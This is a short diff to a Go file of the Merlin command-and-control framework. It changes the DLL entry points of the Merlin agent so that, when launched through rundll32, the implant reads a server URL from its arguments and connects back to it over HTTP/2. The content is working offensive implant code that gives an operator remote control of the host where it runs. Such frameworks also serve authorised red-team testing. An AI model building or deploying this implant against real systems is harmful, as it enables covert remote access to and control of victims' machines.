@@ -21,16 +21,35 @@ package main
 
 import (
 	"C"
+	"os"
+	"strings"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/agent"
 )
 
-func main() {
-	a := agent.New(false, false)
-	a.Run("https://127.0.0.1:443/", "h2")
-}
+func main() {}
 
 //export VoidFunc
-func VoidFunc() {main()}
+func VoidFunc() {
+	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,VoidFunc"
+	var url = "https://127.0.0.1:443/"
+	if len(os.Args) >= 3 {
+		if strings.HasPrefix(strings.ToLower(os.Args[0]),"rundll32"){
+			url = os.Args[2]
+		}
+	}
+	run(url)
+}
+
+//export Run
+func Run(){
+	VoidFunc()
+}
+
+// run is a private function called by exported functions to instantiate/execute the Agent
+func run(url string){
+	a := agent.New(false, false)
+	a.Run(url, "h2")
+}
 
